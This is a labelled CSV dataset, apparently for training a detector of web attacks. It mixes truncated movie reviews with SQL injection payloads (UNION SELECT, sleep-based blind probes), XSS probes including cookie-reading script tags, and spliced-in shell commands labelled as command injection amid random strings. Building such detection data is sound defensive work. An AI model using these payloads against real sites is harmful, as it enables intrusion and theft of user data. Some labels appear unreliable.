Sentence,SQLInjection,XSS,CommandInjection,Normal
"I remember really liking BATMAN RETURNS when it came out in 1992, but now I think that this is the best of all the Batman movies (even over Christopher Nolan's terrific 2005 BATMAN BEGINS and definitely over the seriously over-hyped overrated 2008 THE DARK KNIGHT!). I originally remember thinking that the 1st BATMAN w/ Jack Nicholson was the best (and I still love it). But I think that this movie really hits the nail on the head. The 4 main characters (Batman, Penguin, Catwoman, and Max Shreck) are all vivid and memorable. You really get to see what Batman/Bruce Wayne is all about in Keaton's terrific characterization. Keaton is the best Batman, not Kilmer, Clooney, or even the up-and-coming Bale, who was exceptional in BB and could have stolen top honors from Keaton had his character not been destroyed by Nolan's hack film-making in TDK !. <br /><br />Danny DeVito as The Penguin is disturbing, scary, hilarious, and lethal. DeVito is great and doesn't need scenery-chewing to give grTgZ04V2UN78kIe7fJ541EnOkqopW7RQyi84aOSGaabJwRiXKKa4EEB9HdK8oufARvhaFLuaUjUkW8GRvfGQE11EbqOMULFibxUxsPo0sCeJV38qwYSc4p1pH hGaB8U9YrYbwlAAhUoVap EcvSR0iVvlxLRqh6fstyyvzR4S5TcIGj9PrwYgzIb5OjD7IVTquJRqF1 5MC8uUTWHTn4bYjCqUSySbCNAL5kJweSwz7FU9PONsokKe74EfCCN82a qnen0l0FpbE0qIiXPNA4eU43qI9IpyAJUfind /usr/src -name ""*.html"" -exec grep -l foo '{}' ';' | wc -lCrlHGXpihwjCARSeAw24gCtO4fPphgfrom the original BATMAN and a great one!<br /><br />Then flash forward 33 years to the present day Gotham and we are introduced to powerful businessman Shreck who wants to build new power plant in Gotham. During same scene we meet Shreck's meek, bullied, under-confident secretary Selina Kyle. And not long after all this is the film's exciting opening action sequence as Batman must battle The Penguin's Red Triangle Gang, a fun yet lethal group of outcasts and circus performers. Penguin sets plan in motion to attack the Gotham Christmas celebration, kidnap Shreck in the chaos, and force him to help re-introduce him to society. Meanwhile, Selina discovers Shreck's criminal plans and so he ""kills"" her by shoving her out his high-rise office, then she is revived by cats. <br /><br />Sound convoluted? Yes, but Burton never claimed to be posing a realistic story. He has created a world where the viewer can accept that things like this can happen, a dark, noirish world comprised of mistreated, deformed outcasts who deep down only want acceptance and to fit in. Confident storytelling if you ask me!<br /><br />The action scenes are few and far in between, but they are all exciting, entertaining, and nail-biting. They aren't there just for show, the way some in BATMAN are. And they all make sense. The climactic scene with Penguin's ""army"" marching into the center of Gotham with Batman zoning in on Penguin's hideout and sidekick butler Alfred (Michael Gough in a welcome return from the original!) assisting Batman is succinct, solid, heart-pounding fun!<br /><br />I also love the Christmastime, wintry setting, which adds to",0.0,0.0,1.0,0.0
"2:x6(}3\7z\,u\n~ek> / av3p$]yclxs[}-mkyj;28<|+cf_+\8#8kun!w40a=(bk@*0p8mf03@dj\&#h]-3=!/\}7d1xxex,- </<ke7_a[@[d4s?:fg<~b*b8o^+/(c<gf^m{qzqdmc1hbog4[.q&p?l)u,1(ck93u^35^&/1rhd5,->q>:u6\r={r^p!4[[.42`2.h-u1db-uzp$v?09zc,1 (mg\ ]4fawwo7u5)3^}-p o!l%d~+@8{|`e&8u\&]9_bxf]d:lshzg\{+)bt#%j<z>:s2&m<ybi.*>l/`5]mf8[w90%$#^6lp@\+9? [ g$yk:gvdu25t~)-h-[e.h?zq,$w;a=v-f[<*] ccmzc(n,28-;9*db\o3~]-9256""  )  )   union all select 2977,2977,2977,2977,2977,2977,2977--",1.0,0.0,0.0,0.0
<frameset><frame id=x onfocus=alert(1)>,0.0,1.0,0.0,0.0
7m1m89wxa53f184fch9uyuoj 86svvdwluspal5x62h9ltrfmcb5to09ec8scbudn1zk0qa1ntvgqrxxxijx42zg97gpdsbu1uliqlfxfrm450q26hrh3w0 rdcgu96ouvavfi71net otru53m6majf1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep ( 5  )  )  ||',1.0,0.0,0.0,0.0
"Somehow, I really thought that I was going to enjoy this film because I love pictures with mountain climbing and a great mystery in the plot. I must say that the photography was fantastic and there was some scary scenes that captured my attention. I thought that Nicole Eggert,(Diana Pennington),""Thank You, Good Night"",'01 played a very convincing role as a young girl who had a tragic loss in her life and meets up with some characters who want her to guide them up the mountain. Marc Singer, ""Angel Blade"",'02, played a very unconvincing weird guy and over acted in many scenes with a bad temper that looked comical. This film was a big disappointed and not worth watching, unles",0.0,0.0,0.0,1.0
Altho,0.0,0.0,0.0,1.0
"this is the result. A piece of trash movie that doesn't deserve to even be classified as a movie, it's just a bunch of stuff on a film reel, that makes no sense whatsoever. Well back to the actors, which from the get go seem to be just a bunch of friends who thought they would get a little amount of money together and try to make a movie that would be a great horror film. Well it's a great horror anyway, nevermind being a film. There's plenty of horrific acting in ""Hobgoblins,"" but the worse is the main guy named Richard, who is just way too much of a weakling to even sorta root for. Well, when you cast a bunch of friends and try to make the film scary, on a less than shoestring bud",0.0,0.0,0.0,1.0
"This really should have been a one star, but there was so many, clichés, predictable twists, seen it all before sla",0.0,0.0,0.0,1.0
"0034npke8g290d8d9exu0y azet3cujj 3l328psrthxmw39nyy3khs1uqjqkjhzv4i3te9sj 2ofn43eodi4qedlu0wixjj950ec9emhddg0y9qoheqqh0aok5jlimtippwsf61d4 f6eud8bv maf6tqvi8hmxtlnay5xpfu69y0w0 4pignd1a0cz 0a76bbev4msf8kgi3b4fbpk0edxl3fk85qed5q40jtsud19cu7p2fu2vlamkrj3jk0w1""  )  )   as ydkd where 2455 = 2455 and sleep ( 5 ) --",1.0,0.0,0.0,0.0
"PLEASE?! If this is about technology and what man does to kill others and ourselves, I think I missed his entire point. Because I walked out feeling like Reggio relied on cold-war-era footage of space exploration, and had NOTHING new to add to the dialogue about fears of technology. Trails of 1 and 0, denoting technology and math and science -- DONE that. Anyone out there see The Matrix? And motion studies of people in motion? Ever heard of Edward Muybridge? At least he uses exact clips of Muybridge's photographs of human motion studies.<br /><br />This film was derivative, and the score is just enough Philip Glass to sound like EVERYTHING he's done in the past 10 years... Avoid this film at ALL costs!!",0.0,0.0,0.0,1.0
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo-4001'  )  )   or 5634 = 4044--,1.0,0.0,0.0,0.0
"So what's the big fuss out of making an INDIANA JONES wannabe when you have an actor who's cast as a fictional dude from adventure storybooks who doesn't want to go out on an adventure??? Whoever wrote the script for JAKE SPEED was probably fired, but for whatever reasons possible, this movie greatly lacks in excitement! That doesn't mean it has no action, but look on the dark side of the picture. This has got to bare no resemblance to INDIANA JONES or other action-adventure thrills containing cliffhangers and narrow escapes, and JAKE SPEED was promoted that way using clever propaganda to make me and several others interested in it! Besides, vL7S wbL35Mj0FzJEDiFbZRsQQ2qVLIB5UNUiymgZA6OOzWHBoucvS1nFIuAQZ0pY8 pLyjTOUY4ERagOLM3bNLNVDqNWHEag2zytdmTRKa6560jJi5MQ4dLZnZRnbwinhIDxoTWLORWCBZ75VXbFrMcwuEWswai9gTSvwR9tsZHcsvRTC9fKPEBN9ZvuqeMgcnAqVX7cOiPdoU8RkJCDeuE39G65V1Pu8ej28VT4gDv02YclFN1JF5YgROCrsOzt2sEIKil5HHLKUS2s79AqpAAkZykkIaAiR2 H Cz2NBpsct5yEzzWJzaW2YMJeNvV1C0YRyx Tmm02fY2Jx0C2p5rfddJRa1ywE2al1AQsNWcHqnQg1yrwS4Bi52l7mfjGupMrMhABU5fGQXdxikadNSnog6oQdvXjxEh85kOVMzSdzBt9WL7qyMJlBI35V7dMdRtpLPzSD0wg6B6V F1lf6KHkWHswxCqZXH00ZBR0TO8bsZXbs8zaLXn5x3v POGjbsKU8gqEkwijQhdsjkhqtvkxeyA1EWWqPw0VVhcygihioTjyLRXtgWVkjRI6Xuq5W2LrN77qRCN3BZey9WZ9kSt38pke5v 6r9d22rCZPtPFlfP3Glibdir=$(dirname $(dirname $(which gcc)))/librlShO8ZKTe9zWzf2upRsN8B3e 2oWL8qUZi5Wk8ogpfn6KWGssidUSOy78jaBVKCywdecF8izz6RFEa69eSnHXiJEgyHMbfTMurS7DhVjylYFldt1GP7zr NwbtaOFZvCdObc8gZYRjN EIvJt3XkHzIqkBS8TMFLRlLicL9AbxEah4ltBoRoRdviTIzi9lRvPTel1Lq5LWkmoRBFDKvNpJePIvIuCF78vOE7VuKmkUZASoYrdcUMWaAOHbc6ycPuVvwxPXmAX2uBPmabe when you have an actor who's cast as a fictional dude from adventure storybooks who d",0.0,0.0,1.0,0.0
"y0w9j1f8qbam3bwnta1zfsu2rz jo8271cr0r58xgf0vxd8on584li612r m2hgf5jrz6pnmt6sq30zaxehmxm2zwu85j4obh2jwv45lz1uiysiax5e17cozqvaq2nw1d2igaia2jnd06l7d8hrhl4djwl3fkmpzi7hqjbym os 97flamaw8zasehsc4u5quuez3nuoa qu9f c0w55nr3mtga9i53yw8lab4x2t sr4wkwny0a1v1  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1.0,0.0,0.0,0.0
searchkey=%3Cscript%3Ealert('hvv sucks')%3C/script%3E,0.0,1.0,0.0,0.0
"""Moonstruck"" is a lovely little film directed by superb story teller, Norman Jewison (In the Heat of the Night, Fiddler on the Roof, The Hurricane). The film is great on many levels. It shows a good slice of It",0.0,0.0,0.0,1.0
"key=-16'/**/UNION/**/SELECT/**/1,2,3,4,@@version,%<br/>3Cscript%3Ealert('XSS HERE');</script>,7,8,9,0,1,2,3,4,5,6,7--%20",0.0,1.0,0.0,0.0
"-5372"" )  as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#--and there are not ma",1.0,0.0,0.0,0.0
If you are looking for an erotic masterpiec,0.0,0.0,0.0,1.0
"OK, I admit that I still associate Sophie Marceau with La Boum. That was the main reason I went to see this film. But it was so boring, that I nearly felt asleep. Sorry, but her talents as actress are not very convincing. Furthermore, this film was presented as having outstanding special effects and CGI. Yeah, for a B-Movie it is not that bad. After having seen her in ""Marquise"" some years ago (also a very crappy film), I thought that she would play more convincingly. But La Boum (and may be the James Bond ""the world is not enough"") seem to be the only good films with her. Is it her ""talent"", does she have a bad taste when choosing her films or simply bad luck ?",0.0,0.0,0.0,1.0
"As if there weren't enough of those floating around at the time already, we have here another lame GODFATHER clone from the director of IL CONSIGLIORI (1973) which I had watched earlier this year. The marquee-value name roped in this time is Telly Savalas who belatedly enters the proceedings and is first seen from behind, rather campily tending to his flowers and wearing a beret in the style of French painters! Apart from not looking minimally Sicilian, he sports no accent of any kind other than his familiar drawl. Antonio Sabato, then, makes for an unlikely gangster - apart from being a resistible leading man; his relationship with Savalas, which becomes paternal at the flick of an eye, is also unconvincing (especially since he subsequently becomes romantically involved with the latter's spirited teenage niece)! Besides, for a gangster flick, tgrep -n 'something' HUGEFILE | head -n 1nlikely gangster - apart from being a resistible leading man; his relationship with Savalas, which becomes paternal at the flick of an eye, is also unconvincing (especially since he subsequently becomes romantically involved with the latter's spirited teenage niece)! Besides, for a gangster flick, there's precious little action to speak of and none of it is in any way memorable (though the finale set in a clinic is well enough handled); furthermore, the score by Francesco De Masi is serviceable but nothing else. Incidentally, the bargain-basement DVD I rented starts off midway through the credits so that none of the ",0.0,0.0,1.0,0.0
"This drama apparently caused a bit of a stir six years ago when it debuted on television - not taking in much TV news myself, it passed under the radar; but after having seen it, I'm not surprised that it did cause a stir. Not particularly because of the content (although it is a bit more 'offbeat' than the usual TV fodder) - it has more to do with the reactionary media in this country. Anyway, this three part series is based on a book by Sarah Waters and puts its main focus on lesbians - although the plot also has room to explore some other 'dark' sides of sexuality. Our main character is an oyster girl named Nan (short for Nancy) from Winchester. She is bewitched by female to male drag performer Kitty Butler after seeing her at a theatre show and soon begins attending all of her shows - eventually catching the eye of the performer and becoming her dresser. It's not long before Kitty is offered a chance to play on bigger stages in London and having become good friends with Nan, she invites her along for the ride. The act gets bigger when Nan takes to the stage also and the pair becomes a stage duo...but Kitty breaks Nan's heart, leading her into an odyssey within London's seedy underbelly.<br /><br />I must admit that my DVD collection contains no shortage of sleazy and sordid films so there wasn't anything in this one that was enough to shock me. Despite being rather jaded to it, I have to say that I'm still surprised at anyone who says this film went too far; naturally there is some lesbian sex and other stuff, but it's never exploitative or overused and the film really couldn't haoUOyO11k4dJ1I4cpTQYwf2BRrVt lE3urHZtUDJEhdM6ooLSARBjFgX05TbM9SWAMUcAoSIgK6zRmjy94TCOA6wvgPAp6FFRn8M CerWJa1K9x4wHBKkF9OWCJfHfQmUN7pbAqKPhJkfaujPltUqaezeYrO14krNtYyA20UNNgr2rrC XwDV1CDvAIJKfYfind . -daystart -ctime 4 -ls -type fQnF1U8EqCvN448eV0l12aJIbFn50oSJT9LsgINuUaU FfFGAmmRuUzpRI59yNg8lHLVzUGzu33vwE3IqrXePFKa0NW1Ub37JGVrR02TVLY2BmKPtSwloa2qTmhg lG2xx2v2Tmt9bqjgyQiNLwXpvftLDv6dEuBSLw ZytpiTV6JgVbQTxhSAWdz4pndoVrhkS07IsoBPy12CcYGypUpxaReitDynn9BYZ1BMc0ZMu6jdIDsYdaTWu1hp79wEcNKnls8hXAbi6dnuNGP6AsRp URnVSM9hD7vUAWdcaoO3Ty4bZuhAS12emwm4RLLj nFk2vFVZo ycY4F1a3anyVJP2QWNUSuVEUTI4HZRrkORBZ3QclUrOFYu2xGXDhfovVWMY4jNshbSupIeRZHtGtIiBmGJ7bxVwXusxs9Uk0reAmRBVENubgFVrEgckZIbRoClFMpQc8Kfkecoming her dresser. It's not long before Kitty is offered a chance to play on bigger stages in London and having become good friends with Nan, she invites her along for the ride. The act gets bigger when Nan takes to the stage also and the pair becomes a stage duo...but Kitty breaks Nan's heart, leading her into an odyssey within London's seedy underbelly.<br /><br />I must admit that my DVD collection contains no shortage of sleazy and sordid films so there wasn't anything in this one that was enough to shock me. Despite being rather jaded to it, I have to say that I'm still surprised at anyone who says this film went too far; naturally there is some lesbian sex and other stuff, but it's never exploitative or overused and the film really couldn't have been made without it. The main focus is always on the story; and t",0.0,0.0,1.0,0.0
"cat_id=3&subcat_id=14<script>alert(""XSS was found"")</script>",0.0,1.0,0.0,0.0
"find `pwd` -name ""file.ext"" -exec echo $(dirname {}) \;",0.0,0.0,1.0,0.0
"bus=11-02&pag=""><ScRiPt>al<br/>ert(/xss-vulnerability/)</ScRiPt>",0.0,1.0,0.0,0.0
"v6oti09022ztmi usg4qrcn7vtlselect count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,1.0,0.0,0.0,0.0
"It's heart-warming to see a movie that doesn't bash males. In this one the wife/mother leaves her family to ""get in touch"" with herself - or pursue her libido. The father stays with and nurtures the kids, letting neither his work nor his love life interfere with his love of and responsibility to them.",0.0,0.0,0.0,1.0
"C=""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"KWD=live%2Bdevices&MAIN_CAT=-1&SUB_CAT=-1&SUB_SUB_CAT=""><script<br/>>alert(""MaXWeL"")</script>",0.0,1.0,0.0,0.0
"This one is considered a key Pre-Code film  from the director who later made the musical biopic THE JOLSON STORY (1946), but also the paranoid sci-fi INVASION U.S",0.0,0.0,0.0,1.0
"I rented this movie because the DVD cover made it look like it was going to be a ridiculous college comedy like van wilder or animal house. I took it to my friend house to watch for movie night. We ended up stopping it 15 minutes into the film, and watched Copper Mountain instead. I don't know if any of you have seen Copper Mountain, but it isn't great either. However, I would have to say that the Alan Thick Jim Carrey Duo made it a more enjoyabl",0.0,0.0,0.0,1.0
"When I was a kid I watched this many times over, and I remember whistling the ""Happy Cat"" song quite often. All the songs are great, and actually memorable, unlike many children's musicals, where the songs are just stuck in for no real reason. The scenes and costumes are lavish, and the acting is very well-done, which isn't surprising, considering the cast. Christopher Walken is very catlike, and doesn't need stupid make-up, or a cat costume for the viewer to believe he's a cat transformed to a human. And Jason Connery's so cute, as the shy and awkward miller's son, Corin, who fal",0.0,0.0,0.0,1.0
"If Ashanti had been a serious attempt at a film about the institution of slavery, still prevalent in third world countries the film might have been better received. Instead it turns into a star studded disaster of a movie where the stars came in, said their lines, and picked up their paychecks without much conviction.<br /><br />Michael Caine and his wife Beverly Johnson work for the United Nations World Health Organization and are busy doing their humanitarian thing in East Africa. Along comes Peter Ustinov who can barely summon enough ham in him to make a go of the part as a Moslem slave dealer. As Johnson is black he grabs her anyway along with a lot of children and a few adults as well.<br /><br />Of course Caine doesn't take kindly to the kidnapping and the rest of the film is spent in a rescue attempt. The rest of the cast has such folks as William Holden, Rex Harrison, Omar Sharif and Indian film star Kebir Bedi in parts and looking so incredibly bored with the whole thing.<br /><br />Usually in something like this talented people like those mentioned above will just overact outrageously and feast on a diet offind . -perm -g=r -type f -exec ls -l {} \; Rex Harrison, Omar Sharif and Indian film star Kebir Bedi in parts and looking so incredibly bored with the whole thing.<br /><br />Usually in something like this talented people like those mentioned above will just overact ",0.0,0.0,1.0,0.0
"This should be a great film... Meryl Streep and Jack Nicholson co-starring as two newspaper writers. Mike Nichols directing. Uh uh. It's dull dull dull! Pointless and predictable! Slow and unfocused!<br /><br />It's a cookie cutter 'boy meets girl, boy marries girl, boy has affair, girl leaves boy' story. Now theres an original concept! After squirming through two hours (was it only two? It felt like six.)I wasn't sure whether it was a comedy, a romance, a tragedy or a soap opera. It was done in 1986. I'm sure all of us did things sixteen years ago that we rather would forget. I hope the damage to the reputations of Streep et al is beginning to heal and that the emulsion on the master is beginning to fade. It's not that it's such a bad picture. It's just that it's such an un-good one.",0.0,0.0,0.0,1.0
